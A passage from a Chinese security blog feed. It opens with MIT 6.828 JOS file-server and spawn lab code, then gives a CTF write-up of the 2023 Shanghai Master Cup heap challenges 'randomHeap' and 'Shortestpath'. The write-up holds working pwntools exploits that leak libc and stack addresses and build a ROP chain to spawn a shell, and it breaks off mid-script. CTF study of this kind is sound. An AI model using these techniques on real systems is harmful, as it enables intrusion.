openfile_lookup(envid, req-&gt;req_fileid, &amp;po)) &lt; <span class="number">0</span>)</span><br><span class="line">           <span class="keyword">return</span> r;</span><br><span class="line"></span><br><span class="line">   <span class="comment">//防止溢出</span></span><br><span class="line"><span class="keyword">if</span>(req-&gt;req_n&gt;PGSIZE)</span><br><span class="line">req-&gt;req_n = PGSIZE;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> ((r = file_read(po-&gt;o_file, ret-&gt;ret_buf, req-&gt;req_n, po-&gt;o_fd-&gt;fd_offset)) &lt; <span class="number">0</span>)</span><br><span class="line">           <span class="keyword">return</span> r;</span><br><span class="line">       po-&gt;o_fd-&gt;fd_offset += r;</span><br><span class="line">       <span class="keyword">return</span> r;</span><br><span class="line">   }</span><br><span class="line"></span><br><span class="line">   <span class="type">int</span></span><br><span class="line">   <span class="title function_">serve_write</span><span class="params">(<span class="type">envid_t</span> envid, <span class="keyword">struct</span> Fsreq_write *req)</span></span><br><span class="line">   {</span><br><span class="line">       <span class="keyword">if</span> (debug)</span><br><span class="line">           cprintf(<span class="string">"serve_write %08x %08x %08x\n"</span>, envid, req-&gt;req_fileid, req-&gt;req_n);</span><br><span class="line">       <span class="comment">// LAB 5: Your code here.</span></span><br><span class="line">       <span class="type">int</span> r;</span><br><span class="line">       <span class="class"><span class="keyword">struct</span> <span class="title">OpenFile</span> *<span class="title">po</span>;</span></span><br><span class="line">       <span class="keyword">if</span> ((r = openfile_lookup(envid, req-&gt;req_fileid, &amp;po)) &lt; <span class="number">0</span>)</span><br><span class="line">           <span class="keyword">return</span> r;</span><br><span class="line">       <span class="keyword">if</span> ((r = file_write(po-&gt;o_file, req-&gt;req_buf, req-&gt;req_n, po-&gt;o_fd-&gt;fd_offset)) &lt; <span class="number">0</span>)</span><br><span class="line">           <span class="keyword">return</span> r;</span><br><span class="line">       po-&gt;o_fd-&gt;fd_offset += r;</span><br><span class="line">       <span class="keyword">return</span> r;</span><br><span class="line">   }</span><br><span class="line"></span><br><span class="line">   <span class="type">static</span> <span class="type">ssize_t</span></span><br><span class="line">   <span class="title function_">devfile_write</span><span class="params">(<span class="keyword">struct</span> Fd *fd, <span class="type">const</span> <span class="type">void</span> *buf, <span class="type">size_t</span> n)</span></span><br><span class="line">   {</span><br><span class="line">       <span class="comment">// Make an FSREQ_WRITE request to the file system server.  Be</span></span><br><span class="line">       <span class="comment">// careful: fsipcbuf.write.req_buf is only so large, but</span></span><br><span class="line">       <span class="comment">// remember that write is always allowed to write *fewer*</span></span><br><span class="line">       <span class="comment">// bytes than requested.</span></span><br><span class="line">       <span class="comment">// LAB 5: Your code here</span></span><br><span class="line">       <span class="keyword">if</span> (n &gt; <span class="keyword">sizeof</span>(fsipcbuf.write.req_buf))</span><br><span class="line">           panic(<span class="string">"devfile_write: invalid n\n"</span>);</span><br><span class="line">       fsipcbuf.write.req_fileid = fd-&gt;fd_file.id;</span><br><span class="line">       fsipcbuf.write.req_n = n;</span><br><span class="line">       memmove(fsipcbuf.write.req_buf, buf, n);</span><br><span class="line">       </span><br><span class="line">       <span class="keyword">return</span> fsipc(FSREQ_WRITE, <span class="literal">NULL</span>);</span><br><span class="line">   }</span><br></pre></td></tr></tbody></table></figure><h3 id="Spawning-Processes"><a href="#Spawning-Processes" class="headerlink" title="Spawning Processes"></a>Spawning Processes</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">sys_env_set_trapframe</span><span class="params">(<span class="type">envid_t</span> envid, <span class="keyword">struct</span> Trapframe *tf)</span></span><br><span class="line">{</span><br><span class="line"><span class="comment">// LAB 5: Your code here.</span></span><br><span class="line"><span class="comment">// Remember to check whether the user has supplied us with a good</span></span><br><span class="line"><span class="comment">// address!</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Env</span>* <span class="title">e</span>;</span></span><br><span class="line"><span class="type">int</span> r;</span><br><span class="line">    <span class="keyword">if</span> ((r = envid2env(envid, &amp;e, <span class="number">1</span>)) &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> r;</span><br><span class="line">    user_mem_assert(curenv, (<span class="type">void</span> *)tf, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> Trapframe), <span class="number">0</span>); </span><br><span class="line">    </span><br><span class="line">    memmove(&amp;e-&gt;env_tf, tf, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> Trapframe));</span><br><span class="line">    e-&gt;env_tf.tf_cs |= <span class="number">3</span>;</span><br><span class="line">    e-&gt;env_tf.tf_eflags |= FL_IF;</span><br><span class="line">    e-&gt;env_tf.tf_eflags &amp;= ~FL_IOPL_MASK;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h4 id="Sharing-library-state-across-fork-and-spawn"><a href="#Sharing-library-state-across-fork-and-spawn" class="headerlink" title="Sharing library state across fork and spawn"></a>Sharing library state across fork and spawn</h4><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Copy the mappings for shared pages into the child address space.</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">copy_shared_pages</span><span class="params">(<span class="type">envid_t</span> child)</span></span><br><span class="line">{</span><br><span class="line"><span class="comment">// LAB 5: Your code here.</span></span><br><span class="line">    <span class="keyword">extern</span> <span class="keyword">volatile</span> <span class="type">pde_t</span> uvpd[];</span><br><span class="line">    <span class="keyword">extern</span> <span class="keyword">volatile</span> <span class="type">pte_t</span> uvpt[];</span><br><span class="line">    <span class="type">int</span> r;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">uintptr_t</span> va=<span class="number">0</span>;va&lt;UTOP;)</span><br><span class="line">{</span><br><span class="line"><span class="keyword">if</span>((uvpd[va &gt;&gt; PDXSHIFT]&amp;PTE_P)==<span class="number">0</span>)</span><br><span class="line">{</span><br><span class="line">va += PGSIZE*NPTENTRIES;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> perm = uvpt[va &gt;&gt; PTXSHIFT] &amp; PTE_SYSCALL;</span><br><span class="line">        <span class="keyword">if</span> ((perm &amp; PTE_P) == <span class="number">0</span>) {    <span class="comment">// Page not mapped.</span></span><br><span class="line">            va += PGSIZE;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">if</span> (perm &amp; PTE_SHARE) {</span><br><span class="line">            <span class="keyword">if</span> ((r = sys_page_map(<span class="number">0</span>, (<span class="type">void</span> *)va, child, (<span class="type">void</span> *)va, perm)) &lt; <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">return</span> r;</span><br><span class="line">        }</span><br><span class="line">        va += PGSIZE;</span><br><span class="line">}</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
          <category> 操作系统 </category>
          
          <category> 6.828 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 6·828 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>中华武数杯2023 WP</title>
      <link href="/2023/Shanghai-Master-WP/"/>
      <url>/2023/Shanghai-Master-WP/</url>
      
        <content type="html"><![CDATA[<p>最喜欢的高版本堆题,挺有意思的.<br><del>所以到底叫上海大师杯还是中华武数杯</del></p><h1 id="randomHeap"><a href="#randomHeap" class="headerlink" title="randomHeap"></a>randomHeap</h1><p>glibc2.35堆,保护全开</p><h2 id="逆向"><a href="#逆向" class="headerlink" title="逆向"></a>逆向</h2><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310171525325.png"></p><p>程序实现了这样的堆管理结构.初始化时,分配了16个堆管理结构和16个大小为0x28字节的堆块,放入chunk_list和chunk_manager_list.正常情况下这两个结构应该是用户不可见的.</p><span id="more"></span><p>用户的对堆块的操作是通过user_chunk_manager_list,每次add会从chunk_manager_list取出一个堆管理结构的指针放到user_manager_list中,不涉及malloc的操作.</p><p>这三个list之间的id是随机产生的,没有对应关系.且堆块和堆管理结构的分配顺序也是随机的.</p><p>在show的时候没有对idx的判断,可以将IO_2_1_stdin_结构作为伪造的堆管理结构,泄露出libc地址.在edit的时候也没有对offset的判断.可以使offset为负数来修改某个堆块上方的堆管理结构,由于堆块和管理结构产生顺序随机,这里需要爆破一下,之后就可以完成任意地址读写.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310171526228.png"></p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">lg = <span class="keyword">lambda</span> x, y: log.success(<span class="string">f'<span class="subst">{x}</span>: <span class="subst">{<span class="built_in">hex</span>(y)}</span>'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    io = process(binary)</span><br><span class="line">    p.init(io,e,libc)</span><br><span class="line">    show(-<span class="number">34</span>)</span><br><span class="line">    io.recvuntil(<span class="string">'Data: '</span>)</span><br><span class="line">    io.recv(<span class="number">5</span>)</span><br><span class="line">    p.leak_libc(<span class="string">'libc_base'</span>,p.recvaddress(<span class="string">'bytes'</span>)-<span class="number">0x21ba80</span>)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">0</span>,<span class="string">'aaaa\n'</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">16</span>):</span><br><span class="line">        add(i,<span class="string">'b\n'</span>)</span><br><span class="line">    edit(<span class="number">0</span>,-<span class="number">0x18</span>,p64(p.environ_addr))</span><br><span class="line">    stack = <span class="number">0</span></span><br><span class="line">    idx = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">16</span>):</span><br><span class="line">        show(i)</span><br><span class="line">        io.recvuntil(<span class="string">'Data: '</span>)</span><br><span class="line">        r = io.recv(<span class="number">8</span>,timeout=<span class="number">0.2</span>)</span><br><span class="line">        stack = u64(r)-<span class="number">0x120</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">hex</span>(stack).startswith(<span class="string">'0x7ff'</span>):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            idx = i</span><br><span class="line">            lg(<span class="string">"stack"</span>,stack)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> idx == <span class="number">0</span>:</span><br><span class="line">        io.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    edit(<span class="number">0</span>,-<span class="number">0x18</span>,p64(stack))</span><br><span class="line">    edit(idx,<span class="number">0</span>,p64(p.libc_rdi))</span><br><span class="line">    edit(<span class="number">0</span>,-<span class="number">0x18</span>,p64(stack+<span class="number">8</span>))</span><br><span class="line">    edit(idx,<span class="number">0</span>,p64(p.binsh_addr))</span><br><span class="line">    edit(<span class="number">0</span>,-<span class="number">0x18</span>,p64(stack+<span class="number">0x10</span>))</span><br><span class="line">    edit(idx,<span class="number">0</span>,p64(p.libc_ret))</span><br><span class="line">    edit(<span class="number">0</span>,-<span class="number">0x18</span>,p64(stack+<span class="number">0x18</span>))</span><br><span class="line">    edit(idx,<span class="number">0</span>,p64(p.system_addr))</span><br><span class="line">    menu(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    io.sendline(<span class="string">'cat /flag'</span>)</span><br><span class="line">    <span class="keyword">if</span> p.recvflag():</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure><h2 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h2><p>init的时候分配了这样的大堆块,可以部分覆写chunk_manager的指针来指向这些大块,释放进largebin再泄露地址.</p><p>预期解爆破挺不容易的,要爆堆布局和爆一位ASLR.可以用扫描所有堆结构尝试泄露地址的方式来减少堆布局的爆破.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310172133067.png"></p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">lg = <span class="keyword">lambda</span> x, y: log.success(<span class="string">f'<span class="subst">{x}</span>: <span class="subst">{<span class="built_in">hex</span>(y)}</span>'</span>)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive() <span class="keyword">if</span> io.connected() <span class="keyword">else</span> io.close()</span><br><span class="line">one_gadget = <span class="keyword">lambda</span> filename=LIBC: <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, subprocess.check_output([<span class="string">'one_gadget'</span>, <span class="string">'--raw'</span>, filename]).split()))</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    remain = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">2</span>,<span class="number">15</span>))</span><br><span class="line">    io = process(binary)</span><br><span class="line">    p.init(io,e,libc)</span><br><span class="line">    add(<span class="number">0</span>,<span class="string">'aaa\n'</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">15</span>):</span><br><span class="line">        add(i,<span class="string">'b\n'</span>)</span><br><span class="line">    delete(<span class="number">1</span>)</span><br><span class="line">    edit(<span class="number">0</span>,-<span class="number">0x18</span>,<span class="string">b'\x90\xa0\n'</span>)</span><br><span class="line">    heap = <span class="number">0</span></span><br><span class="line">    idx = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,<span class="number">15</span>):</span><br><span class="line">        show(i)</span><br><span class="line">        io.recvuntil(<span class="string">'Data: '</span>)</span><br><span class="line">        r = io.recv(<span class="number">8</span>,timeout=<span class="number">0.2</span>)</span><br><span class="line">        heap = u64(r)-<span class="number">0x120</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">hex</span>(heap).startswith(<span class="string">'0x55'</span>):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            idx = i</span><br><span class="line">            lg(<span class="string">"idx"</span>,idx)</span><br><span class="line">            <span class="comment"># pause()</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> idx == <span class="number">0</span>:</span><br><span class="line">        io.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    </span><br><span class="line">    edit(<span class="number">0</span>,-<span class="number">0x18</span>,<span class="string">b'\xa0\xa2\n'</span>)</span><br><span class="line">    delete(idx)</span><br><span class="line">    <span class="built_in">print</span>(idx)</span><br><span class="line">    <span class="built_in">print</span>(remain)</span><br><span class="line">    remain.remove(idx)</span><br><span class="line"></span><br><span class="line">    add(<span class="number">16</span>,<span class="string">'aaa\n'</span>)</span><br><span class="line">    edit(<span class="number">16</span>,-<span class="number">0x18</span>,<span class="string">b'\xa0\xa2\n'</span>)</span><br><span class="line">    heap = <span class="number">0</span></span><br><span class="line">    idx = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> remain:</span><br><span class="line">        show(i)</span><br><span class="line">        io.recvuntil(<span class="string">'Data: '</span>)</span><br><span class="line">        r = io.recv(<span class="number">8</span>,timeout=<span class="number">0.2</span>)</span><br><span class="line">        addr = u64(r)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">hex</span>(addr).startswith(<span class="string">'0x7f'</span>):</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            idx = i</span><br><span class="line">            lg(<span class="string">"idx:"</span>,idx)</span><br><span class="line">            <span class="comment"># pause()</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> idx == <span class="number">0</span>:</span><br><span class="line">        io.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    show(idx)</span><br><span class="line">    io.recvuntil(<span class="string">'Data: '</span>)</span><br><span class="line">    p.leak_libc(<span class="string">'libc_base'</span>,p.recvaddress(<span class="string">'bytes'</span>)-<span class="number">0x219ce0</span>)</span><br><span class="line"></span><br><span class="line">    edit(<span class="number">16</span>,-<span class="number">0x18</span>,p64(p.environ_addr))</span><br><span class="line">    io.recv()</span><br><span class="line">    show(idx)</span><br><span class="line">    io.recvuntil(<span class="string">'Data: '</span>)</span><br><span class="line">    stack = p.recvaddress(<span class="string">'bytes'</span>)-<span class="number">0x120</span></span><br><span class="line">    lg(<span class="string">"stack"</span>,stack)</span><br><span class="line"></span><br><span class="line">    edit(<span class="number">16</span>,-<span class="number">0x18</span>,p64(stack))</span><br><span class="line">    edit(idx,<span class="number">0</span>,p64(p.libc_base+<span class="number">0x2a745</span>))</span><br><span class="line">    edit(<span class="number">16</span>,-<span class="number">0x18</span>,p64(stack+<span class="number">8</span>))</span><br><span class="line">    edit(idx,<span class="number">0</span>,p64(p.binsh_addr))</span><br><span class="line">    edit(<span class="number">16</span>,-<span class="number">0x18</span>,p64(stack+<span class="number">0x18</span>))</span><br><span class="line">    edit(idx,<span class="number">0</span>,p64(p.system_addr))</span><br><span class="line">    menu(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">    io.sendline(<span class="string">'cat /flag'</span>)</span><br><span class="line">    <span class="keyword">if</span> p.recvflag():</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></tbody></table></figure><h1 id="Shortestpath"><a href="#Shortestpath" class="headerlink" title="Shortestpath"></a>Shortestpath</h1><p>2.35堆,保护全开</p><h2 id="逆向-1"><a href="#逆向-1" class="headerlink" title="逆向"></a>逆向</h2><p>是一个求图中两点间最短路径的程序,算法大概是从起点开始广搜然后比较所有能到达终点的路径长度(<del>一点算法不懂的表示很难逆</del>).</p><p>程序的图是用如下结构来表示的.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310192032023.png"></p><p>可以无限制的创建结点和边,输入函数有个offbynull,且可以绕开’\0’的截断,由此可以将tcache和unsortedbin中的堆拿出来,泄露堆和libc地址.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310192035153.png"></p><p>现在就差任意写了,看看最短路径函数.<br>变量命名有点逆天,因为我是按照刚学的算法逆的,逆完发现就是个广搜.</p><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310192038807.png"></p><p>该函数使用如下的结构.算法首先创建了一个PathInfo的数组dist(存储路径信息)和一个S_set集合(记录一个结点是否已经以其为源点进行过广搜).<br>manager中的bottom_idx和top_idx,用作dist数组的索引.可以理解为双指针(形成的队列).<br>每搜到一个结点,<code>无论是否已经由其他点出发搜到过</code>,将该路径信息存到dist[top_idx]中.top_idx++.每以一个结点为源点开始搜索,将dist[bottom_idx]取出存到栈上的path,进行计算操作,bottom_idx++.这样top_idx和bottom_idx之间的PathInfo,就是已搜到但还未以其为源点搜索的结点(其实是路径信息).直到top_idx==bottom_idx,完成广搜.</p><p>不过有一个问题,dist数组只分配了node_count+1个PathInfo,而算法是每搜到一个结点,<code>无论是否已经由其他点出发搜到过</code>,将该路径信息存到dist数组中,所以存在溢出.构造一个图,其中一个结点有很多条入边,可以Poc出这个漏洞.</p><p>但我没有往这方面走,因为有另一个洞更吸引我注意.这个洞在逆向过程中很容易发现:<del>啊啊啊这两个__int64到底是啥啊也没初始化啊啊</del>.嗯哼,manager结构没有初始化.我们可以提前布置一个堆块伪造manager结构并释放,在short的时候取出,将其作为manager,由于tcache取出时对key的清0,bottom_idx的初始值一定为0.我们仅能控制top_idx.</p><p><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310192044234.png"></p><p>看看怎么利用.可以发现在进入循环之前的深搜初始化工作,将起点存到dist[top_idx]中,其中src_key是我们可控的,于是便有了dist+top_idx*0x18+8地址处的8字节任意写.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310192111186.png"></p><p>别高兴太早,这样破坏内存的行为很容易导致程序崩溃.<br>橙色框中是容易导致崩溃的地方(还有内循环的store_dist函数).尝试通过黄色框中的条件绕过:第一个比较是无符号比较,无法通过负数绕过.第二个比较的cur_key不可控,无法绕过.gg<br>于是为了避免崩溃,我们的top_idx只能为一个较小数,只能完成在堆上的近似任意写(近似是因为有0x18倍数的要求).那就劫持tcache然后改stderr,再利用offbynull清空topchunk触发malloc_assert.<br><img src="https://obsidian-1314737433.cos.ap-beijing.myqcloud.com/202310192115313.png"></p><h2 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h2><p>唉,最喜欢的调堆环节.<br>我知道exp里结点编号很乱…调完风水懒得改了</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">p.init(io,e,libc)</span><br><span class="line"></span><br><span class="line">promt = <span class="string">":"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">menu</span>(<span class="params">option</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">':'</span>,<span class="built_in">str</span>(option))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">src,dst,size,content,val</span>):</span><br><span class="line">    <span class="keyword">global</span> promt</span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    io.sendlineafter(promt,<span class="built_in">str</span>(src))</span><br><span class="line">    io.sendlineafter(promt,<span class="built_in">str</span>(dst))</span><br><span class="line">    io.sendlineafter(promt,<span class="built_in">str</span>(size))</span><br><span class="line">    io.sendafter(promt,content)</span><br><span class="line">    io.sendlineafter(promt,<span class="built_in">str</span>(val))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">short</span>(<span class="params">src,dst,step</span>):</span><br><span class="line">    <span class="keyword">global</span> promt</span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    io.sendlineafter(promt,<span class="built_in">str</span>(src))</span><br><span class="line">    io.sendlineafter(promt,<span class="built_in">str</span>(dst))</span><br><span class="line">    io.sendlineafter(promt,<span class="built_in">str</span>(step))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">src,dst</span>):</span><br><span class="line">    <span class="keyword">global</span> promt</span><br><span class="line">    menu(<span class="number">4</span>)</span><br><span class="line">    io.sendlineafter(promt,<span class="built_in">str</span>(src))</span><br><span class="line">    io.sendlineafter(promt,<span class="built_in">str</span>(dst))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">src,dst</span>):</span><br><span class="line">    <span class="keyword">global</span> promt</span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    io.sendlineafter(promt,<span class="built_in">str</span>(src))</span><br><span class="line">    io.sendlineafter(promt,<span class="built_in">str</span>(dst))</span><br><span class="line"></span><br><span class="line">lg = <span 